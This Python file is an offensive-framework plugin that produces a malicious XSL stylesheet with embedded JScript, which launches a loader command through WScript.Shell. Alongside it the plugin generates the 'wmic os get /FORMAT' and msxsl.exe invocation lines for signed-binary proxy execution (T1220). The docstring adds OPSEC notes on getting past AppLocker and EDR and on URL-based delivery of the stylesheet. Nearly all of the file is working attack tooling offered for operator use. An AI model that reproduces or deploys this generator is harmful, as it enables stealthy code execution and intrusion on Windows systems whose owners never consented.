"""
XSL Transform / WMIC abuse trigger plugin (T1220).

Produces a .xsl stylesheet containing an embedded JScript execution block.
Invoked via:
    wmic os get /FORMAT:<path_or_url>
or (if msxsl.exe is available on target):
    msxsl.exe input.xml transform.xsl

OPSEC notes:
  - wmic.exe is deprecated in Windows 11 22H2+ but present on most enterprise targets.
  - wmic.exe / msxsl.exe are signed Microsoft binaries - AppLocker default allow.
  - The JScript block runs in-process inside wbemdisp.dll / msxml6.dll via
    the XSLT engine; no child process is spawned until WScript.Shell.Run fires.
  - Execution chain: wmic -> msxml6 (XSLT engine) -> JScript -> WScript.Shell ->
    loader process. EDR rules targeting this are primarily wmic-level command
    argument inspection and msxml6 loading JScript blocks.
  - URL-based XSL delivery is noisier (DNS + HTTP) but avoids on-disk artifact;
    local path delivery requires the file to land on disk first.
"""

import os
from ..plugin_base import ErebusPlugin, PluginMetadata, PluginCategory


_plugin = ErebusPlugin(
    metadata=PluginMetadata(
        name="XSL Transform Trigger",
        description="Produces a .xsl stylesheet for WMIC/msxsl proxy execution (T1220)",
        author="erebus",
        version="1.0.0",
        category=PluginCategory.TRIGGER,
        supported_os=["Windows"],
    )
)


_XSL_TEMPLATE = """\
<?xml version="1.0"?>
<stylesheet version="1.0"
  xmlns="http://www.w3.org/1999/XSL/Transform"
  xmlns:ms="urn:schemas-microsoft-com:xslt"
  xmlns:user="placeholder">
<output method="text"/>
<ms:script implements-prefix="user" language="JScript">
<![CDATA[
function Execute() {{
  var oShell = new ActiveXObject("WScript.Shell");
  oShell.Run("{loader_cmd}", 0, false);
  return "";
}}
]]>
</ms:script>
<template match="/">
  <value-of select="user:Execute()"/>
</template>
</stylesheet>
"""

_INPUT_XML = """\
<?xml version="1.0"?>
<root/>
"""


def create_xsl_trigger(payload_path: str, output_dir: str, **kwargs) -> dict:
    """
    Generate XSL transform trigger artifacts.

    Args:
        payload_path: Full command line to invoke the loader binary on the target.
        output_dir:   Directory where output files are written.
        **kwargs:
            xsl_url (str): If provided, the run_cmd will use this URL instead of
                           the local .xsl path (for URL-based delivery via wmic).
            include_input_xml (bool): Write a minimal input.xml alongside the .xsl
                           for msxsl.exe invocation. Default: False.

    Returns:
        dict with keys:
            xsl_path     - absolute path to the generated .xsl file
            input_xml    - absolute path to input.xml (None if not generated)
            run_cmd      - wmic command line for the operator
            msxsl_cmd    - msxsl.exe command (if include_input_xml=True)
    """
    os.makedirs(output_dir, exist_ok=True)

    xsl_filename = "transform.xsl"
    xsl_path = os.path.join(output_dir, xsl_filename)

    loader_escaped = payload_path.replace("\\", "\\\\").replace('"', '\\"')
    xsl_content = _XSL_TEMPLATE.format(loader_cmd=loader_escaped)

    with open(xsl_path, "w", encoding="utf-8") as fh:
        fh.write(xsl_content)

    xsl_target = kwargs.get("xsl_url", xsl_path)
    run_cmd = f"wmic os get /FORMAT:\"{xsl_target}\""

    input_xml_path = None
    msxsl_cmd = None
    if kwargs.get("include_input_xml", False):
        input_xml_path = os.path.join(output_dir, "input.xml")
        with open(input_xml_path, "w", encoding="utf-8") as fh:
            fh.write(_INPUT_XML)
        msxsl_cmd = f"msxsl.exe \"{input_xml_path}\" \"{xsl_path}\""

    return {
        "xsl_path": xsl_path,
        "input_xml": input_xml_path,
        "run_cmd": run_cmd,
        "msxsl_cmd": msxsl_cmd,
    }


def register():
    _plugin.register_function("create_xsl_trigger", create_xsl_trigger)
    return _plugin


def on_load():
    return register()
